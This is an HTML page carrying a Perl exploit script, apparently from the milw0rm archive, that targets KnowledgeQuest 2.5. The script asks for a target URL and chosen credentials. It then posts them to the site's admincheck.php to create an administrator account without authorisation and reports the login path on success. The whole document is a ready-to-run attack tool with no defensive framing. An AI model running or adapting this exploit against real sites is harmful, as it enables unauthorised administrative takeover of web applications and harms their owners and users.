<html><head><title>KnowledgeQuest 2.5 Arbitrary Add Admin Exploit</title></head><pre>#!/usr/bin/perl

use strict;
use LWP::UserAgent;

print &quot;-+------------------------------------------+-\n&quot;;
print &quot;-+- KnowledgeQuest 2.5 Arbitrary Add Admin -+-\n&quot;;
print &quot;-+------------------------------------------+-\n&quot;;
print &quot;-+-     Discovered &amp;&amp; Coded By t0pP8uzz    -+-\n&quot;;
print &quot;-+-  This Exploit will craft a evilpacket  -+-\n&quot;;
print &quot;-+-     which will add a admin account     -+-\n&quot;;
print &quot;-+------------------------------------------+-\n&quot;;

print &quot;Enter URL: &quot;;
	chomp(my $url=&lt;STDIN&gt;);
	
print &quot;Enter Username (you will login with this): &quot;;
	chomp(my $usr=&lt;STDIN&gt;);

print &quot;Enter Password (you will login with this): &quot;;
	chomp(my $pwd=&lt;STDIN&gt;);

my $ua  = LWP::UserAgent-&gt;new( agent=&gt; 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)' );
my $res = $ua-&gt;post( $url.&quot;/admincheck.php&quot;, {'username' =&gt; $usr, 'password' =&gt; $pwd, 'repas' =&gt; $pwd} );

if($res-&gt;is_success) {

	if($res-&gt;content =~ /taken by another user/i) { print &quot;\n\nExploit Failed! Reason: username already taken!&quot;; exit; }
	
	print &quot;\n\nExploit Success! Login to &quot;.$url.&quot;administratorlogin.php with username: &quot;.$usr.&quot; and password: &quot;.$pwd.&quot;\n&quot;;
}

# milw0rm.com [2008-04-09]</pre></html>